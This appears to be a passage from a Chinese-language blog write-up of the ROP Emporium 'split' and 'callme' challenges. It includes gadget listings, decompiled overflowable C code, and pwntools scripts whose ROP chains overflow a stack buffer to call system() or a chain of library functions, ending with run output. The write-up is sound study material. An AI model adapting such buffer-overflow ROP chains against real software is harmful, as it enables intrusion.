+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./split --only <span class="string">&quot;pop|ret&quot;</span>Gadgets information</span></span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007c0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007c2 : pop r15 ; ret</span><br><span class="line">0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400618 : pop rbp ; ret</span><br><span class="line">0x00000000004007c3 : pop rdi ; ret</span><br><span class="line">0x00000000004007c1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040053e : ret</span><br><span class="line">0x0000000000400542 : ret 0x200a</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>
+<p>可以看到 <strong>pop_rdi</strong> 的地址为<code>0x00000000004007c3</code>，因此构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0x00000000004007c3</span>)      <span class="comment"># pop_rdi</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000601060</span>)      <span class="comment"># /bin/cat flag.txt</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000400560</span>)      <span class="comment"># system</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="callme">callme</h2>
+<p>这道题考的是如何构造函数调用链以达到解密flag的思路。</p>
+<h3 id="x86-2">x86</h3>
+<p>题目解压后出现5个附件，经分析，对flag进行了逐步加密，并写入了<code>encrypted_flag.dat</code>文件中，需要对该过程进行逆向，逐步还原flag，首先查看题目代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);			<span class="comment">// 溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同时题目中提示userfulFunction：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但这三个函数均位于<code>libcallme32</code>动态链接库中，查看动态链接库中的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">callme_one</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> || a2 != <span class="number">-889275714</span> || a3 != <span class="number">-804392947</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_A00);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  g_buf = (<span class="type">int</span>)<span class="built_in">malloc</span>(<span class="number">0x21</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  g_buf = (<span class="type">int</span>)fgets((<span class="type">char</span> *)g_buf, <span class="number">33</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;callme_one() called correctly&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<strong>callme_one</strong>函数的功能是从<code>encrypted_flag.dat</code>中读取加密后的flag，写入到g_buf全局缓冲区中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">callme_two</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> || a2 != <span class="number">-889275714</span> || a3 != <span class="number">-804392947</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;key1.dat&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_A00);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key1.dat&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(_BYTE *)(g_buf + i) ^= fgetc(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;callme_two() called correctly&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>callme_two</strong>函数的功能是先读取key1.dat中的内容，然后使用该内容对g_buf全局缓冲区进行异或运算</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">callme_three</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-559038737</span> &amp;&amp; a2 == <span class="number">-889275714</span> &amp;&amp; a3 == <span class="number">-804392947</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;key2.dat&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_A00);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key2.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">16</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      *(_BYTE *)(g_buf + i) ^= fgetc(stream);</span><br><span class="line">    *(_DWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEF</span>;</span><br><span class="line">    *(_DWORD *)(g_buf + <span class="number">8</span>) ^= <span class="number">0xDEADBEEF</span>;</span><br><span class="line">    *(_DWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABE</span>;</span><br><span class="line">    *(_DWORD *)(g_buf + <span class="number">16</span>) ^= <span class="number">0xCAFEBABE</span>;</span><br><span class="line">    *(_DWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00D</span>;</span><br><span class="line">    *(_DWORD *)(g_buf + <span class="number">24</span>) ^= <span class="number">0xD00DF00D</span>;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>callme_three</strong>函数的功能与callme_two函数类似，先读取<code>key2.dat</code>的内容，然后使用该内容与g_buf全局缓冲区异或，并逐个异或其他值，最终打印输出g_buf的内容。</p>
+<p>值得注意的是，上述三个函数均开始对传入的三个参数的值进行判断，若不一致，则退出，因此若想调用这三个函数，需要传入正确的参数。</p>
+<p>至此，可以概括出利用路径，构造rop，覆盖pwnme函数的返回地址，使其依次调用callme_one，callme_two，callme_three函数，并且构造好三个函数的参数，为了平衡栈空间，需要pop指令将函数参数依次弹出。</p>
+<p>在callme32中搜索相关指令，得到如下结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary callme32 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080487fb : pop ebp ; ret</span><br><span class="line">0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484ad : pop ebx ; ret</span><br><span class="line">0x080487fa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048496 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>
+<p>因此可以利用<code>0x080487f9</code>地址的三个pop将函数参数弹出，查看三个函数的地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.plt:080484F0 _callme_one     proc near               ; CODE XREF: usefulFunction+31↓p</span><br><span class="line">.plt:080484F0                 jmp     ds:off_804A018</span><br><span class="line">.plt:080484F0 _callme_one     endp</span><br><span class="line"></span><br><span class="line">.plt:08048550 _callme_two     proc near               ; CODE XREF: usefulFunction+20↓p</span><br><span class="line">.plt:08048550                 jmp     ds:off_804A030</span><br><span class="line">.plt:08048550 _callme_two     endp</span><br><span class="line"></span><br><span class="line">.plt:080484E0 _callme_three   proc near               ; CODE XREF: usefulFunction+F↓p</span><br><span class="line">.plt:080484E0                 jmp     ds:off_804A014</span><br><span class="line">.plt:080484E0 _callme_three   endp</span><br></pre></td></tr></table></figure>
+<p>最终，构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">one = <span class="number">0x080484F0</span></span><br><span class="line">two = <span class="number">0x08048550</span></span><br><span class="line">three = <span class="number">0x080484E0</span></span><br><span class="line">pop_esi_edi_ebp = <span class="number">0x080487f9</span></span><br><span class="line">arg1 = <span class="number">0xDEADBEEF</span></span><br><span class="line">arg2 = <span class="number">0x0CAFEBABE</span></span><br><span class="line">arg3 = <span class="number">0x0D00DF00D</span></span><br><span class="line"></span><br><span class="line">payload += p32(one)</span><br><span class="line">payload += p32(pop_esi_edi_ebp) <span class="comment"># func one 的返回地址，将func one的三个参数依次弹出，以调用func two</span></span><br><span class="line">payload += p32(arg1) </span><br><span class="line">payload += p32(arg2) </span><br><span class="line">payload += p32(arg3)</span><br><span class="line"></span><br><span class="line">payload += p32(two)</span><br><span class="line">payload += p32(pop_esi_edi_ebp)</span><br><span class="line">payload += p32(arg1) </span><br><span class="line">payload += p32(arg2) </span><br><span class="line">payload += p32(arg3)</span><br><span class="line"></span><br><span class="line">payload += p32(three)</span><br><span class="line">payload += p32(<span class="number">0x8048510</span>)  <span class="comment"># exit函数，可换成任意的四个字节</span></span><br><span class="line">payload += p32(arg1) </span><br><span class="line">payload += p32(arg2) </span><br><span class="line">payload += p32(arg3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./callme32&#x27;</span>: pid 19785</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">callme by ROP Emporium</span><br><span class="line">x86</span><br><span class="line"></span><br><span class="line">Hope you <span class="built_in">read</span> the instructions...</span><br><span class="line"></span><br><span class="line">&gt; Thank you!</span><br><span class="line">callme_one() called correctly</span><br><span class="line">callme_two() called correctly</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Process <span class="string">&#x27;./callme32&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 19785)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+<h3 id="x64-2">x64</h3>
+<h2 id="write4">write4</h2>
+<h2 id="badchars">badchars</h2>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/rop/" rel="tag"># rop</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/17/CTF%E9%9A%8F%E7%AC%94/" rel="prev" title="CTF随笔">
+      <i class="fa fa-chevron-left"></i> CTF随笔
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2win"><span class="nav-number">1.</span> <span class="nav-text">ret2win</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86"><span class="nav-number">1.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64"><span class="nav-number">1.2.</span> <span class="nav-text">x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#armv5"><span class="nav-number">1.3.</span> <span class="nav-text">armv5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mips"><span class="nav-number">1.4.</span> <span class="nav-text">mips</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#split"><span class="nav-number">2.</span> <span class="nav-text">split</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-1"><span class="nav-number">2.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-1"><span class="nav-number">2.2.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#callme"><span class="nav-number">3.</span> <span class="nav-text">callme</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-2"><span class="nav-number">3.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-2"><span class="nav-number">3.2.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#write4"><span class="nav-number">4.</span> <span class="nav-text">write4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#badchars"><span class="nav-number">5.</span> <span class="nav-text">badchars</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lylanfree"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">lylanfree</p>
+  <div class="site-description" itemprop="description">持续学习的程序员</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lylanfree</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">140k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">2:07</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('post.copy_button').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('post.copy_success')
+          else $(this).text('post.copy_failure')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('post.copy_button')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
